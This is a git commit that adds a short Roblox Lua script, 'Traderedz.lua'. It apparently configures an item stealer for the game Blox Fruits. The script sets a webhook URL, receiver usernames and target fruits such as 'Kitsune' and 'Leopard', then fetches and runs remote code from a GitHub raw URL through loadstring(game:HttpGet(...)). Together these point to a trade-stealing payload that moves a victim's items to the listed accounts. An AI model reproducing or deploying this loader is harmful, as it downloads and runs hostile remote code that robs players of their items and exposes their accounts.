cef8a22fc0ed39729f8c14444b404b0e4274746f
freezemehope <dn2189961@gmail.com>
2025-04-12 01:27:24 +0200

    Create Traderedz.lua

---
+++ Traderedz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Z2xiamZzU0NZQlZQX0s1YWo2VW9MdzplendSbW5pczg3OFhZMklWQXh6NlRiYjdCMFY0U1VRM2FnVVpjdVg4aFd2SUZNa1lCNGItR3dmVVlHUkVCdWNlTVVyUExTS0w2UmZEMlBlOWhvMTlfU2lBR2w2YjRnS2FqYWp5M1J0VFQxYUlTek02S3puVGcxVlZ4dlpSS1Nvb29Pd1d5RXNqeWFTXzkxdkNDRG1MaVVZNG1KeUpnQ1IyNmstOVVjYVFIbVU" -- << Your Webhook
+Usernames = {"coemsonnagaaa", "adoptmeBins1"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
